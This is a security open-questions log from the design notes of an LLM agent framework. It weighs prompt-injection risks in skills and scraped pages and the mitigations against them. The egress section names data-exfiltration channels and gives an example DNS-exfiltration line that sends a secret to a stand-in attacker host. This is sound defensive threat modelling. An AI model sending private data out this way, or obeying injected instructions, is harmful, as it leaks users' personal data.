# Security open-questions log

Status: **open-questions log** — mitigations under consideration,
open observations, and prior-art notes that haven't graduated yet.
Promote an entry into a real plan (or its own long-form `design/ideas/` note)
when the friction shows up.

The *committed* model lives in [`../SECURITY.md`](../../SECURITY.md): a
short code-trust baseline (pikuri + LLM trusted, no code you didn't
write), then the load-bearing prompt-injection section (lethal trifecta
broken by privilege-separated sub-agents), and explicit non-goals. This
file is the not-yet-committed counterpart. The open questions about
the shell and MCP moved to
[pikuri-workshop's log](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/security-open-questions.md)
with those gems.

Threat model scales with capability. `bin/pikuri-chat` today is
small surface (calculator + three stateless network-out tools, no
filesystem writes); the planned secretary reads your mail, calendar
and notes, writes notes and searches the web, and adds the
privacy-of-personal-data axis.

Related long-form notes (the entries below that already grew one):

- `book/trifecta-detector.md` + {Pikuri::Trifecta} — the static
  capability-presence check, **shipped**, with nothing outstanding; its
  forks are `D_egress_axis_shape`, `D_trifecta_map_orphans`,
  `D_write_custody_axis` and `D_no_static_poisoned_flag`.
- [`private-context-taint.md`](private-context-taint.md) — the runtime
  private-in → sever-egress enforcement (and the long-form home of the
  egress-allowlist idea below).
- [`typed-transports.md`](typed-transports.md) — classify each
  LLM-shaped transport (chat / embedder / reranker) `:private` vs
  `:public` from its endpoint host and refuse to mix by default.
- [`bash-confirmer.md`](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/bash-confirmer.md) — the permission-model
  granularity / fatigue work (risk tiers, dry-run, session grants).
- [`more-confirmers.md`](more-confirmers.md) — the human-in-the-loop
  confirmer shapes and the structured-action-context seam.

## Trifecta — open mitigations beyond sub-agent separation

The structural defense (privilege-separated `RESEARCHER` and
`FILE_MINER` sub-agents) shipped and is documented in
[`../SECURITY.md`](../../SECURITY.md) §"Prompt injection". The biggest
adjacent idea — a **structural trifecta detector** — shipped, and is
taught in `book/trifecta-detector.md`. Shorter adjacent ideas still on
the table:

- **Provenance tags around tool output** in the context render
  (untrusted-content markers). Cheap, partial — empirical
  question whether the model pays attention to
  `<untrusted>…</untrusted>` framing.
- **Private-context taint + egress levels** — the long-form
  runtime-enforcement design (coarse context taint on first private
  read; Sealed / Bounded / Off levels; `web_search` whitelisted by
  nature vs `fetch` exfil by nature):
  [`private-context-taint.md`](private-context-taint.md).
  Designed, not built.
- **Egress allowlist** for `fetch` / `bash` when in interactive
  mode (auto-deny non-allowlisted hosts, prompt for first-use
  additions). Note [`private-context-taint.md`](private-context-taint.md)
  **kills the user-curated `fetch` whitelist** (an interactive host is
  attacker-readable), so the surviving live shape is the `bash`-egress /
  network-layer version. Gondolin's egress-proxy pattern (see
  pikuri-workshop's `pikuri-workshop:R_permissions`) is the
  heavyweight structural version.
- **Prompt injection inside skill descriptions?** Skills are
  user-installed text, and "user-vetted by definition"
  ([`../SECURITY.md`](../../SECURITY.md) §"Code trust" — skills bullet) is
  now a claim the host makes per search base rather than an assumption
  the framework carries: `Bundle::Base(trusted:)` defaults to
  *not* vetted and grades the tool's untrusted leg
  (`D_bundle_trust_grading`). That reports the exposure; it does not
  defend against it. A `Mcp::Verifier`-shaped pass for skills would
  belt-and-braces it.
- **A `readable:` root outside `project_root` under `trusted: true`.**
  `Catalog#roots` is documented to be folded into a workspace's
  `readable:` so `read` can load skill sidecars. Do that with
  `~/.claude/skills` on a workspace declared trusted, and `read` vouches
  for bytes nobody vouched for — the vouched-for-island problem
  `Filesystem#trusted?` warns about, arriving through the back door;
  pikuri-workshop's `AllowAll` already raises on `trusted:` for the same
  reason. Latent: `bin/pikuri-code` cannot reach it, since
  `ToolchainPaths` keeps its workspace honestly untrusted whatever the
  user answers. It binds the first host whose readable set *is* the
  project root — the planned TUI. Two exits: extend that raise to any
  `readable:` root outside `project_root`, or stop folding home skill
  roots in and lose sidecar `read` for home skills. See
  `D_bundle_trust_grading`.
- **Content-level defenses against `web_scrape` injection** beyond
  persona separation (provenance tags are the obvious shape).

## Egress is broader than `web_search`

Anywhere bytes leave the box: `bash` → curl/scp/dns/`ping -p`;
`fetch` with attacker-chosen URL; `write` into a Dropbox / iCloud /
git-tracked directory; markdown images rendered by a chat host that
fetches them; error messages echoed back into follow-up turns; the
LLM provider itself when non-local. DNS exfil
(`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
most egress firewalls don't filter port 53. This is why the trifecta
detector's `:egress` leg is tagged generously (an undeclared tool is
presumed to hold it — {Pikuri::Tool::TrifectaLegs::ASSUMED}), and why the killed
`fetch` whitelist can't be rescued by URL-shape heuristics (see
[`private-context-taint.md`](private-context-taint.md)).

## Output-size DoS and cost

A 50MB scraped page → context window blown → API cost spike or OOM in
the tokenizer. A per-tool output-byte cap covers the per-step axis; the
loop-count axis is **uncovered by design** since `D_no_step_limit`
removed the step budget, which makes the per-step cap the only bound on
a single turn's growth. `Bash` (head+tail truncation
via `OUTPUT_HEAD`/`OUTPUT_TAIL`), `Read` (`MAX_BYTES`), and `WebScrape`
each enforce their own cap; remaining gap is a uniform shape across
all tools and disk-spillover of overflow (PI/opencode prior art —
tempfile path returned to the LLM).

## Misc smaller things

- **Logging hygiene.** `Pikuri.logger_for` shouldn't log Authorization
  headers, request bodies, or full search queries (which are often
  sensitive themselves).
- **`URLCache` on disk.** Cached pages with embedded auth cookies or
  sensitive scrape results — disk encryption matters, backups matter.
- **TOCTOU.** Mostly theoretical for an interactive agent, but
  `Workspace::Filesystem`'s check-then-open isn't atomic on POSIX.
- **Sub-agent context leak.** A child given less context than the
  parent can still leak parent context that flows in via the parent's
  "task" prompt.

## Prior art: how PI and opencode handle this

The deep survey of PI's two isolation weights (the bubblewrap-only
`sandbox` extension and the heavier Gondolin micro-VM, with its
egress-proxy + secret-placeholder pattern) and opencode's
tree-sitter-backed `(permission, glob)` permission system — plus the
"worth borrowing" shortlist — now lives in
pikuri-workshop's `pikuri-workshop:R_permissions`, alongside
the higher-level permission/sandboxing comparison it extends. Findings
reinforce pikuri's framing rather than contradict it: neither project
ships prompt-injection defenses, both cap tool output to a tempfile,
both validate sub-agent privilege separation as the right shape.
